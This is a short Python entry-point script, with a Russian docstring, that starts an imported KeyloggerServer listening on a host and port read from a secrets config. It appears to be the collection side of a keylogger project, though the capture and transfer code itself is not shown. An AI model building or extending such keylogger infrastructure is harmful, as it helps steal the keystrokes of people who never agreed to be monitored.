from server import KeyloggerServer
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from config.secrets import TCP_HOST, TCP_PORT

def run_server():
    """Запуск сервера для прослушивания подключений"""
    server = KeyloggerServer(TCP_HOST, TCP_PORT, daemon=False)
    server.start()

if __name__ == "__main__":
    run_server()